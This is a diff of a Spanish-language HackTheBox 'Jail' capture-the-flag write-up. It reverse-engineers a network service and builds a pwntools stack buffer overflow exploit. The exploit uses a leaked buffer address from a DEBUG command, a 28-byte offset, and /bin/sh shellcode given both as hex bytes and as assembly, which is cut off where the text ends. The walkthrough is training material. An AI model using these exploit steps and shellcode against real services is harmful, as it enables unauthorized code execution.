@@ -154,22 +154,17 @@ PORT      STATE SERVICE
 20048/tcp open  mountd</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque es completamente innecesario, solo comodidad agregaremos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> el dominio <code class="language-plaintext highlighter-rouge">jail.htb</code> para que al apuntar a el nos lleve a la ip</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ echo </span><span class="am">"10.10.10.34 jail.htb" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
-</code></pre></div></div><br>
-
 <p class="plain-text">En la página principal nos encontramos un <code class="language-plaintext highlighter-rouge">ascii art</code> que hace referencia al nombre</p>
 <a href="/hackthebox/jail/1.png" target="_blank"><div><p><img src="/hackthebox/jail/1.png"></p></div></a>
 
 <p class="plain-text">Para encontrar directorios en la web podemos aplicar fuerza bruta usando <code class="language-plaintext highlighter-rouge">wfuzz</code>, despues de unos minutos un directorio devuelve otro codigo de estado, <code class="language-plaintext highlighter-rouge">jailuser</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://jail.htb/FUZZ -t 100 --hc 404  
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.34/FUZZ -t 100 --hc 404  
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://jail.htb/FUZZ
+Target: http://10.10.10.34/FUZZ
 Total requests: 220560
 
 =====================================================================
@@ -182,16 +177,18 @@ ID           Response   Lines    Word       Chars       Payload
 <p class="plain-text">Al entrar a jailuser encontramos un directory listing con solo un directorio que es <code class="language-plaintext highlighter-rouge">dev</code>, este contiene un codigo en <code class="language-plaintext highlighter-rouge">c</code>, un script para compilarlo y el <code class="language-plaintext highlighter-rouge">binario</code> compilado</p>
 <a href="/hackthebox/jail/2.png" target="_blank"><div><p><img src="/hackthebox/jail/2.png"></p></div></a>
 
-<p class="plain-text">De acuerdo al codigo al ejecutar el binario deberia iniciar un socket en el puerto <code class="language-plaintext highlighter-rouge">7411</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">memset</span><span class="p">((</span><span class="no">char</span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">server_addr, </span><span class="mi">0</span><span class="p">, </span><span class="o">sizeof</span><span class="p">(server_addr));  
-port </span><span class="o">= </span><span class="mi">7411</span><span class="p">;
-server_addr.sin_family </span><span class="o">= </span><span class="p">AF_INET;
-server_addr.sin_addr.s_addr </span><span class="o">= </span><span class="p">INADDR_ANY;
-server_addr.sin_port </span><span class="o">= </span><span class="p">htons(port);</span>
-</code></pre></div></div><br>
+</section>
 
-<p class="plain-text">Despues de ejecutar el binario podemos conectarnos localmente con <code class="language-plaintext highlighter-rouge">netcat</code> a ese puerto donde se nos piden <code class="language-plaintext highlighter-rouge">credenciales</code>, sin embargo por ahora no las conocemos</p>
+<section class="post" id="shell-nobody">
+<br><h3 class="post-title">Shell - nobody</h3><br>
+
+<p class="plain-text">Aunque el archivo <code class="language-plaintext highlighter-rouge">jail.c</code> nos proporciona el código fuente utilizaremos <code class="language-plaintext highlighter-rouge">ida</code> para desensamblar el binario ya que generalmente este no se tiene disponible, la función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a <code class="language-plaintext highlighter-rouge">socket</code> para crear un nuevo socket, luego a <code class="language-plaintext highlighter-rouge">setsockotp</code> para establecer una opción de socket, todo esto controlando posibles excepciones</p>
+<a href="/hackthebox/jail/5.png" target="_blank"><div><p><img src="/hackthebox/jail/5.png"></p></div></a>
+
+<p class="plain-text">En el siguiente bloque se llama a <code class="language-plaintext highlighter-rouge">htons</code> para darle el formato correcto al valor <code class="language-plaintext highlighter-rouge">7411</code> que es un puerto, luego llama a <code class="language-plaintext highlighter-rouge">bind</code> y <code class="language-plaintext highlighter-rouge">listen</code> para esperar una conexión en él</p>
+<a href="/hackthebox/jail/6.png" target="_blank"><div><p><img src="/hackthebox/jail/6.png"></p></div></a>
+
+<p class="plain-text">Podemos comprobarlo, después de ejecutar el binario podemos conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> a ese puerto donde se nos piden <code class="language-plaintext highlighter-rouge">credenciales</code>, pero no las conocemos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ netcat</span><span class="p"> localhost 7411
 OK Ready. Send USER command.  
@@ -201,42 +198,52 @@ PASS password
 ERR Authentication failed.</span>
 </code></pre></div></div><br>
 
-</section>
+<p class="plain-text">Después mediante un bucle recibe conexiones entrantes utilizando <code class="language-plaintext highlighter-rouge">accept</code> y con <code class="language-plaintext highlighter-rouge">fork</code> se crea un nuevo proceso hijo para cada conexión, si se crea correctamente llama a la función <code class="language-plaintext highlighter-rouge">handle</code> pasando como argumento el nuevo descriptor</p>
+<a href="/hackthebox/jail/7.png" target="_blank"><div><p><img src="/hackthebox/jail/7.png"></p></div></a>
 
-<section class="post" id="shell-nobody">
-<br><h3 class="post-title">Shell - nobody</h3><br>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">handle</code> inicia reservando memoria y llamando a <code class="language-plaintext highlighter-rouge">dup2(s,1)</code> y <code class="language-plaintext highlighter-rouge">dup2(s, 2)</code>, esto para redirigir el <code class="language-plaintext highlighter-rouge">stdout</code> y <code class="language-plaintext highlighter-rouge">stderr</code> al descriptor del socket del cliente</p>
+<a href="/hackthebox/jail/8.png" target="_blank"><div><p><img src="/hackthebox/jail/8.png"></p></div></a>
 
-<p class="plain-text">En la función <code class="language-plaintext highlighter-rouge">auth</code> recibe el usuario y la contraseña, si el usuario es <code class="language-plaintext highlighter-rouge">admin</code> copia password a userpass y lo compara con <code class="language-plaintext highlighter-rouge">974jailbreak!</code> que es la contraseña</p>
+<p class="plain-text">Luego lee <code class="language-plaintext highlighter-rouge">0x400</code> o <code class="language-plaintext highlighter-rouge">1024</code> bytes con <code class="language-plaintext highlighter-rouge">read</code>, después utiliza <code class="language-plaintext highlighter-rouge">strtok</code> para dividir los datos leidos, en el siguiente bloque compara que el valor del comando recibido no sea <code class="language-plaintext highlighter-rouge">0</code>, si no es <code class="language-plaintext highlighter-rouge">0</code> comprueba si ya se ha recibido un usuario anteriormente</p>
+<a href="/hackthebox/jail/9.png" target="_blank"><div><p><img src="/hackthebox/jail/9.png"></p></div></a>
+
+<p class="plain-text">Si aun no se ha recibido un usuario compara los primeros 5 bytes del comando con <code class="language-plaintext highlighter-rouge">USER </code>, si no son iguales lo compara con <code class="language-plaintext highlighter-rouge">PASS </code>, si nuevamente no son iguales lo compara con <code class="language-plaintext highlighter-rouge">DEBUG </code>, esto se puede interpretar como el controlador para saber que hacer de acuerdo al comando recibido de acuerdo con los disponibles</p>
+<a href="/hackthebox/jail/10.png" target="_blank"><div><p><img src="/hackthebox/jail/10.png"></p></div></a>
+
+<p class="plain-text">En el caso de que los primeros <code class="language-plaintext highlighter-rouge">5</code> bytes sean iguales a <code class="language-plaintext highlighter-rouge">USER </code> se copian los bytes a una variable que llamamos <code class="language-plaintext highlighter-rouge">username</code> y se compara si <code class="language-plaintext highlighter-rouge">password</code> ya tiene un valor, si aun no lo tiene se muestra un mensaje con <code class="language-plaintext highlighter-rouge">puts</code> solicitnadolo y vuelve al bucle</p>
+<a href="/hackthebox/jail/12.png" target="_blank"><div><p><img src="/hackthebox/jail/12.png"></p></div></a>
+
+<p class="plain-text">Si los primeros <code class="language-plaintext highlighter-rouge">5</code> bytes son iguales a <code class="language-plaintext highlighter-rouge">PASS </code> copia el valor a una variable llamada <code class="language-plaintext highlighter-rouge">password</code>, luego compara si el campo <code class="language-plaintext highlighter-rouge">username</code> tiene un valor si no lo tiene vuelve al bucle después del mensaje que solicita este valor mostrado con la función <code class="language-plaintext highlighter-rouge">puts</code></p>
+<a href="/hackthebox/jail/11.png" target="_blank"><div><p><img src="/hackthebox/jail/11.png"></p></div></a>
+
+<p class="plain-text">En el caso de que los <code class="language-plaintext highlighter-rouge">5</code> bytes sean iguales a <code class="language-plaintext highlighter-rouge">DEBUG</code> mueve un <code class="language-plaintext highlighter-rouge">1</code> o un <code class="language-plaintext highlighter-rouge">0</code> a la variable <code class="language-plaintext highlighter-rouge">debugmode</code>, asi que si esta desactivado lo activa y si esta activo lo desactiva</p>
+<a href="/hackthebox/jail/13.png" target="_blank"><div><p><img src="/hackthebox/jail/13.png"></p></div></a>
+
+<p class="plain-text">Si los campos <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code> ya cuentan con un valor llama a la función <code class="language-plaintext highlighter-rouge">auth</code> pasandole ambos como argumentos por lo que deberia comprobar credenciales</p>
+<a href="/hackthebox/jail/14.png" target="_blank"><div><p><img src="/hackthebox/jail/14.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">auth</code> inicia comprobando si <code class="language-plaintext highlighter-rouge">debugmode</code> esta activado, si es asi utiliza <code class="language-plaintext highlighter-rouge">printf</code> para enviar un mensaje al socket que muestra la dirección de la variable <code class="language-plaintext highlighter-rouge">dest</code>, si <code class="language-plaintext highlighter-rouge">debugmode</code> no esta habilitado evita todo lo anterior y salta al siguiente bloque que compara la variable <code class="language-plaintext highlighter-rouge">username</code> con la string <code class="language-plaintext highlighter-rouge">admin</code> y hace un salto condicional</p>
+<a href="/hackthebox/jail/15.png" target="_blank"><div><p><img src="/hackthebox/jail/15.png"></p></div></a>
+
+<p class="plain-text">Si el usuario es <code class="language-plaintext highlighter-rouge">admin</code> copia la variable <code class="language-plaintext highlighter-rouge">password</code> a un buffer en <code class="language-plaintext highlighter-rouge">ebp - 24</code> utilizando <code class="language-plaintext highlighter-rouge">strcpy</code> y compara la variable <code class="language-plaintext highlighter-rouge">dest</code> con la string <code class="language-plaintext highlighter-rouge">1974jailbreak!</code>, si alguno de los 2 valores es incorrecto muestra un mensaje y devuelve <code class="language-plaintext highlighter-rouge">0</code>, si son iguales devuelve <code class="language-plaintext highlighter-rouge">1</code></p>
+<a href="/hackthebox/jail/16.png" target="_blank"><div><p><img src="/hackthebox/jail/16.png"></p></div></a>
+
+<p class="plain-text">Si nos autenticamos correctamente nos pide un comando sin embargo no parece tener mucha utilidad, aunque esto es irrelevante ya que si analizamos el ultimo bloque al utilizar <code class="language-plaintext highlighter-rouge">strcpy</code> mueve la contraseña a <code class="language-plaintext highlighter-rouge">ebp - 24</code> por lo que si enviamos mas bytes deberiamos ocasionar un buffer overflow sobrescribiendo otros datos</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int </span><span class="na">auth</span><span class="p">(</span><span class="no">char </span><span class="o">*</span><span class="am">username</span><span class="p">, </span><span class="no">char </span><span class="o">*</span><span class="am">password</span><span class="p">) {
-    </span><span class="no">char </span><span class="p">userpass[</span><span class="mi">16</span><span class="p">];
-    </span><span class="no">char </span><span class="o">*</span><span class="p">response;
-    </span><span class="o">if</span><span class="p"> (debugmode </span><span class="o">== </span><span class="mi">1</span><span class="p">) {
-        </span><span class="no">printf</span><span class="p">(</span><span class="s">"Debug: userpass buffer @ </span><span class="mi">%p\n</span><span class="s">"</span><span class="p">, userpass);  
-        </span><span class="no">fflush</span><span class="p">(stdout);
-    }
-    </span><span class="o">if </span><span class="p">(</span><span class="no">strcmp</span><span class="p">(username, </span><span class="s">"admin"</span><span class="p">) </span><span class="o">!= </span><span class="mi">0</span><span class="p">) </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-    </span><span class="no">strcpy</span><span class="p">(userpass, password);
-    </span><span class="o">if </span><span class="p">(</span><span class="no">strcmp</span><span class="p">(userpass, </span><span class="s">"1974jailbreak!"</span><span class="p">)</span><span class="o"> == </span><span class="mi">0</span><span class="p">) {
-        </span><span class="o">return </span><span class="mi">1</span><span class="p">;
-    } </span><span class="o">else</span><span class="p"> {
-        </span><span class="no">printf</span><span class="p">(</span><span class="s">"Incorrect username and/or password.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-        </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-    }
-    </span><span class="o">return </span><span class="mi">0</span><span class="p">;
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Lo interesante no es la contraseña sino que define un buffer de solo <code class="language-plaintext highlighter-rouge">16 bytes</code> para userpass, ademas que usa la funcion <code class="language-plaintext highlighter-rouge">strcpy</code> que es vulnerable a buffer overflow</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">char </span><span class="p">userpass[</span><span class="mi">16</span><span class="p">];
-</span><span class="no">strcpy</span><span class="p">(userpass, password);</span>
+<code><span class="ve">❯ netcat </span><span class="p">localhost 7411
+OK Ready. Send USER command.
+USER admin
+OK Send PASS command.
+PASS 1974jailbreak!
+OK Authentication success. Send command.  
+HELP
+ERR Invalid command.</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Mirando las protecciones del binario con <code class="language-plaintext highlighter-rouge">checksec</code> vemos que no tiene ninguna</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">jail
-[</span><span class="az">*</span><span class="p">] '/home/kali/jail'
+[</span><span class="az">*</span><span class="p">] '/home/user/jail'
     Arch:     i386-32-little
     RELRO:    </span><span class="am">Partial RELRO</span><span class="p">
     Stack:    </span><span class="ro">No canary found</span><span class="p">
@@ -245,80 +252,52 @@ ERR Authentication failed.</span>
     RWX:      </span><span class="ro">Has RWX segments</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Lo primero sera encontrar el offset, asi que iniciamos corriendo el programa en <code class="language-plaintext highlighter-rouge">gdb</code></p>
+<p class="plain-text">Para comprobar la vulnerabilidad solo iniciamos corriendo el programa en <code class="language-plaintext highlighter-rouge">gdb</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ gdb </span><span class="p">-q jail
 Reading symbols from </span><span class="ve">jail</span><span class="p">...
 (No debugging symbols found in </span><span class="ve">jail</span><span class="p">)
 </span><span class="ro">pwndbg> </span><span class="p">run
-Starting program: </span><span class="ve">/home/kali/jail</span><span class="p">
+Starting program: </span><span class="ve">/home/user/jail</span><span class="p">
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  </span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Creamos un script que se conecte y envie como usuario <code class="language-plaintext highlighter-rouge">admin</code> y como contraseña una cadena de <code class="language-plaintext highlighter-rouge">50</code> caracteres especialmente diseñados para encontrar un offset</p>
+<p class="plain-text">El buffer vulnerable inicia en <code class="language-plaintext highlighter-rouge">ebp - 24</code>, para comprobarlo lo llenaremos con <code class="language-plaintext highlighter-rouge">24 A's</code>, luego <code class="language-plaintext highlighter-rouge">4 B's</code> que deberian sobreescribir el valor de <code class="language-plaintext highlighter-rouge">ebp</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> para el retorno</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/pỳthon3
-</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, cyclic
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote
 
-payload </span><span class="o">= </span><span class="p">cyclic(</span><span class="mi">50</span><span class="p">)
+payload </span><span class="o"> =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 24</span><span class="p">
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload </span><span class="o">+=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 16</span><span class="p">
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
-
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.34"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"command.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">b</span><span class="s">"USER admin"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"command.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">b</span><span class="s">"PASS " </span><span class="o">+ </span><span class="p">payload)  </span>
 </code></pre></div></div><br>
 
+<p class="plain-text">Al enviar el exploit comprobamos lo anterior, en ebp se guardan las <code class="language-plaintext highlighter-rouge">B's</code> y el valor de retorno son las <code class="language-plaintext highlighter-rouge">C's</code>, además las <code class="language-plaintext highlighter-rouge">D's</code> se quedan almacenadas en el stack, como conclusión tenemos que el <code class="language-plaintext highlighter-rouge">offset</code> para el puntero de retorno es de <code class="language-plaintext highlighter-rouge">28</code> bytes</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 127.0.0.1 on port 7411: Done  
-[</span><span class="az">*</span><span class="p">] Closed connection to 127.0.0.1 port 7411</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Al ejecutar el exploit volvemos a <code class="language-plaintext highlighter-rouge">gdb</code> y vemos que el programa se detuvo, ahora usando <code class="language-plaintext highlighter-rouge">cyclic</code> podemos encontrar el offset que son la cantidad de bytes basura necesarios antes de sobreescribir el registro puntero EIP, son solo <code class="language-plaintext highlighter-rouge">28</code> bytes</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">run
-Starting program: </span><span class="ve">/home/kali/jail</span><span class="p">
+<code><span class="ro">pwndbg></span><span class="p"> run
+Starting program: </span><span class="ve">/home/user/jail</span><span class="p">
+[Depuración de hilo usando libthread_db enabled]
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  
 
-Program received signal SIGSEGV, Segmentation fault.
-</span><span class="az">0x61616168 </span><span class="p">in </span><span class="am">??</span><span class="p"> ()
-</span><span class="ro">pwndbg> </span><span class="p">cyclic -l $eip
-</span><span class="sa">Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
-</span><span class="ve">Found at offset 28
+Thread 2.1 "jail" received signal SIGSEGV, Segmentation fault.
+[Cambiando a Thread 0xf7fc24c0 (LWP 27556)]
+</span><span class="az">0x43434343</span><span class="p"> in</span><span class="am"> ?? </span><span class="p">()
+</span><span class="ro">pwndbg></span><span class="p"> p/x $ebp
+$1 = 0x42424242
+</span><span class="ro">pwndbg></span><span class="p"> p/x $eip
+$2 = 0x43434343
+</span><span class="ro">pwndbg></span><span class="p"> x/4wx $esp
+</span><span class="az">0xffffcd80</span><span class="p">:	0x44444444	0x44444444	0x44444444	0x44444444
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para comprobar el offset enviaremos <code class="language-plaintext highlighter-rouge">28 A's</code> hasta antes de sobreescribir el EIP donde enviaremos <code class="language-plaintext highlighter-rouge">4 B's</code> y despues a modo de traza <code class="language-plaintext highlighter-rouge">16 C's</code> que estaran en el ESP</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">offset </span><span class="o">= </span><span class="mi">28</span><span class="p">
-junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
-
-eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-esp </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">16</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">esp  </span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Otra cosa interesante es el comando <code class="language-plaintext highlighter-rouge">DEBUG</code> que en caso de estar habilitado mostrara el puntero donde se encuentra <code class="language-plaintext highlighter-rouge">userpass</code> osea todo nuestro payload enviado</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="o">else if </span><span class="p">(</span><span class="no">strncmp</span><span class="p">(token, </span><span class="s">"DEBUG"</span><span class="p">, </span><span class="mi">5</span><span class="p">) </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
-  </span><span class="o">if</span><span class="p"> (debugmode </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
-      debugmode </span><span class="o">= </span><span class="mi">1</span><span class="p">;
-      </span><span class="no">printf</span><span class="p">(</span><span class="s">"OK DEBUG mode on.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-      </span><span class="no">fflush</span><span class="p">(stdout);
-  } </span><span class="o">else if</span><span class="p"> (debugmode </span><span class="o">== </span><span class="mi">1</span><span class="p">) {
-      debugmode </span><span class="o">= </span><span class="mi">0</span><span class="p">;
-      </span><span class="no">printf</span><span class="p">(</span><span class="s">"OK DEBUG mode off.</span><span class="mi">\n</span><span class="s">"</span><span class="p">);
-      </span><span class="no">fflush</span><span class="p">(stdout);
-  }
-
-</span><span class="o">if</span><span class="p"> (debugmode </span><span class="o">== </span><span class="mi">1</span><span class="p">) {
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"Debug: userpass buffer @ </span><span class="mi">%p\n</span><span class="s">"</span><span class="p">, userpass);  
-    </span><span class="no">fflush</span><span class="p">(stdout);
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Lo que podemos hacer es agregar el comando <code class="language-plaintext highlighter-rouge">DEBUG</code> al script y al recibir la direccion <code class="language-plaintext highlighter-rouge">leak</code> convertirlo a un entero, ya que probablemente tengamos que usar ese leak</p>
+<p class="plain-text">Necesitamos conocer la dirección del shellcode para apuntar a el en el retorno, para ello podemos habilitar la función <code class="language-plaintext highlighter-rouge">DEBUG</code> antes reverseada que en caso de estar habilitada mostraba la dirección de la variable de destino, escribimos esto en python</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/pỳthon3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log
@@ -326,10 +305,10 @@ payload </span><span class="o">= </span><span class="p">junk </span><span class=
 offset </span><span class="o">= </span><span class="mi">28</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-esp </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">16</span><span class="p">
+ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
+stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">16</span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">esp
+payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret </span><span class="o">+ </span><span class="p">stack
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 
@@ -354,7 +333,7 @@ log.info(</span><span class="no">f</span><span class="s">"Leak addr: </span><spa
 <p class="plain-text">Volviendo a <code class="language-plaintext highlighter-rouge">gdb</code> el programa corrompe y si miramos lo que hay en esa direccion, es la direccion donde inicia nuestro input donde estan las <code class="language-plaintext highlighter-rouge">A's</code>, <code class="language-plaintext highlighter-rouge">B's</code> y <code class="language-plaintext highlighter-rouge">C's</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">run
-Starting program: </span><span class="ve">/home/kali/jail</span><span class="p">
+Starting program: </span><span class="ve">/home/user/jail</span><span class="p">
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".  
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -368,7 +347,7 @@ Program received signal SIGSEGV, Segmentation fault.
 
 <p class="plain-text">Enviamos <code class="language-plaintext highlighter-rouge">28 A's</code> de basura y <code class="language-plaintext highlighter-rouge">4 B's</code> para sobreescribir el puntero por lo que la direccion donde inician las <code class="language-plaintext highlighter-rouge">C's</code> deberia estar <code class="language-plaintext highlighter-rouge">32</code> bytes mas adelante del leak</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">print/x 0xffffcf30 + 32
+<code><span class="ro">pwndbg> </span><span class="p">p/x 0xffffcf30 + 32
 $1 = 0xffffcf50
 </span><span class="ro">pwndbg> </span><span class="p">x/4wx 0xffffcf50
 </span><span class="az">0xffffcf50</span><span class="p">:     0x43434343      0x43434343      0x43434343      0x43434343  
@@ -378,28 +357,87 @@ $1 = 0xffffcf50
 <p class="plain-text">Si cambiamos el <code class="language-plaintext highlighter-rouge">host</code> y corremos el exploit contra la máquina victima nos muestra la direccion <code class="language-plaintext highlighter-rouge">0xffffd610</code> que si le sumamos <code class="language-plaintext highlighter-rouge">32</code> o 0x20 nos da <code class="language-plaintext highlighter-rouge">0xffffd630</code>, esta es la direccion donde se guardaran las <code class="language-plaintext highlighter-rouge">C's</code> cuando ejecutemos el exploit en remoto</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to jail.htb on port 7411: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.34 on port 7411: Done  
 [</span><span class="az">*</span><span class="p">] Leak addr: 0xffffd610
-[</span><span class="az">*</span><span class="p">] Closed connection to jail.htb port 7411</span>
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.10.34 port 7411</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg> </span><span class="p">print/x 0xffffd610 + 32  
+<code><span class="ro">pwndbg> </span><span class="p">p/x 0xffffd610 + 32  
 $2 = 0xffffd630
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Algo a tener en cuenta es que si enviamos un tipico shellcode de <code class="language-plaintext highlighter-rouge">/bin/sh</code> el exploit parece funcionar pero no vemos ningun output, podemos usar un <a href="https://exploit-db.com/exploits/34060">shellcode</a> que usa <code class="language-plaintext highlighter-rouge">dup2</code> para copiar los descriptores en el socket ademas de <code class="language-plaintext highlighter-rouge">execve</code> con <code class="language-plaintext highlighter-rouge">/bin/sh</code>, de este modo la shell lee y escribe datos en el propio <code class="language-plaintext highlighter-rouge">socket</code> y vemos la respuesta</p>
+<p class="plain-text">El tipo de <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> que generalmente usariamos en este tipo de exploits simplemente llama a la función a <code class="language-plaintext highlighter-rouge">execve</code> para ejecutar el comando <code class="language-plaintext highlighter-rouge">/bin/sh</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x89\xe3\x31\xc9\xcd\x80</span><span class="s">"</span>
+<code><span class="no">global</span><span class="na"> _start
+
+_start</span><span class="p">:
+    </span><span class="o">push</span><span class="mi"> 0xb</span><span class="c1">         ; execve()
+    </span><span class="o">pop</span><span class="mi"> eax</span><span class="c1">          ; $eax = execve()
+
+    </span><span class="o">push</span><span class="mi"> 0x68</span><span class="c1">        ; "h"
+    </span><span class="o">push</span><span class="no"> word</span><span class="mi"> 0x732f</span><span class="c1"> ; "/s"
+    </span><span class="o">push</span><span class="mi"> 0x6e69622f</span><span class="c1">  ; "/bin"
